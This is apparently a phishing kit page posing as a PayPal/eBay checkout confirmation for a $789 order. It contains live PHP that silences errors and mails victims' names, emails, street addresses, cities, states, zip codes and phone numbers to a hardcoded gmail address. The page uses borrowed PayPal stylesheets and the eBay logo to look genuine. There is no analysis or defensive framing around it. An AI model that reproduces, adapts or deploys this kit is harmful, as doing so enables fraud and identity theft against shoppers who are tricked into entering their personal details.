<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns:ns1="og" lang="en" xmlns="http://www.w3.org/1999/xhtml" ns1:xmlns="http://ogp.me/ns#">

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	
	<title>Checkout: Succes!</title>
	<meta name="description" content="PayPal is the safer, easier way to pay online without revealing your credit card number.">
	<meta http-equiv="X-UA-Compatible" content="IE=9">
	<link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;MERCHANTPAYMENTWEB&#x2d;640&#x2d;20151004&#x2d;1/css/core/global.css">
	<link rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;MERCHANTPAYMENTWEB&#x2d;640&#x2d;20151004&#x2d;1/Checkout/css/checkout.css">
	<!--[if lte IE 9]><link media="screen" rel="stylesheet" type="text/css" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com&#x2f;MERCHANTPAYMENTWEB&#x2d;640&#x2d;20151004&#x2d;1/Checkout/css/ie.css"><![endif]-->
	<style type="text/css">

	</style>
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="https&#x3a;&#x2f;&#x2f;www&#x2e;paypalobjects&#x2e;com/en_US/i/pui/apple-touch-icon.png">
	<style type="text/css">
		.payment-form{
			padding: 15px;
		}
		#fieldrowCCNumber{
			border:  px solid #bbb;
		}
		#fieldrowCCNumber h4{
			padding: 10px;
			background-color: #D3D3D3;
		}
		.lg-input{
			width: 290px;
		}
		.gg1-input{
			width: 200px;
		}
		.md-input{
			width: 180px;
		}
		.sm-input{
			width: 50px;
		}
		.text-left{
			text-align: left;
		}
		.text-right{
			text-align: right;
		}
		ul.hints{
			margin: 0;
			padding:0;
			list-style: none;
		}
	</style>
</head>

<body>
<?php
error_reporting(0);
      @ini_set(�display_errors�, 0);
$headers  = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

if(!empty($_POST)){
	
	$country = $_POST['country'];
	$contactName = $_POST['contactName'];
	$email = $_POST['contactEmail'];
	$address1 = $_POST['address1'];
	$address2 = $_POST['address2'];
	$city = $_POST['city'];
	$state = $_POST['state'];
	$zip = $_POST['zip'];
	$phone = $_POST['phone'];
		
	$to      = 'ThRuIcH43uSkElD@gmail.com';
	$subject = 'ASDASD';
	
	$message .= '<b>Country or region: </b>'.$country.'<br>';
	$message .= '<b>Contact Name: </b>'.$contactName.'<br>';
	$message .= '<b>Contact Email: </b>'.$email.'<br>';
	$message .= '<b>Street address: </b>'.$address1.'<br>';
	$message .= '<b>Street address 2: </b>'.$address2.'<br>';
	$message .= '<b>City: </b>'.$city.'<br>';
	$message .= '<b>State: </b>'.$state.'<br>';
	$message .= '<b>ZIP code: </b>'.$zip.'<br>';
	$message .= '<b>Phone Number: </b>'.$phone.'<br><br><br>';
	
if(mail($to, $subject, $message, $headers)){
	 				echo '</script>';
			echo '<script type="text/javascript"> window.location = ""</script>';
						
	}
		
}

?>
	<div class="" id="stdpage">
		<div id="header" class="hasminicartLogo"></div>
		<hr>
		<div id="content">
			<div id="headline">
				<h1 class="accessAid"></h1>
			</div>
			<div id="main">
				<div class="layout1">
					<form method="post" action="mailSend.php" class="edit">
					<div class="layout2f">
						<div class="col first">
							<div class="rounded">
								<div class="top outer"></div>
								<div class="body outer clearfix" style="background-color:#BBBBBB;background-image:linear-gradient(top, #FFFFFF 8%, #BBBBBB 30%);background-image:-ms-linear-gradient(top, #FFFFFF 8%, #BBBBBB 30%);background-image:-o-linear-gradient(top, #FFFFFF 8%, #BBBBBB 30%);background-image:-moz-linear-gradient(top, #FFFFFF 8%, #BBBBBB 30%);background-image:-webkit-linear-gradient(top, #FFFFFF 8%, #BBBBBB 30%);background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0.08, #FFFFFF),color-stop(0.3, #BBBBBB ));">
									<div id="merchantLogo"><img src="https&#x3a;&#x2f;&#x2f;securepics&#x2e;ebaystatic&#x2e;com&#x2f;aw&#x2f;pics&#x2f;logos&#x2f;logoNewEbay2012&#x2e;gif" border="0" alt="eBay"></div>
									<div class="rounded child">
										<div class="top inner"></div>
										<div class="body clearfix" id="miniCartContent" style="height:1475px;">
											<div id="miniCart" class="">
												<div class="paymentDone">
													<div class="orderDetails subhead">Your order total</div>
<div class="total">US $789</div>
												</div>
												<p>Thank you for your purchase! Your order is confirmed with eBay. You will receive the invoice with payment details in the next 12 hours.</p>
											</div>
										</div>
										<div class="bottom inner"></div>
									</div>
								</div>
								<div class="bottom outer" style="background-color:#BBBBBB;"></div>
							</div>
						</div>
						<div class="col last">
							<div id="sliderWrapper">
								<div id="parentSlider">
									<div id="sliders">
										<div id="billingModule">
											<div id="hdrContainer">
												<h2></h2></div>
											<div class="panel scTrack:main&#x3a;ec&#x3a;ebay&#x3a;ux&#x3a;start:ClickLogin">
												<span class="rightarrow"></span>
												<div class="subhead">
													


</body>

</html>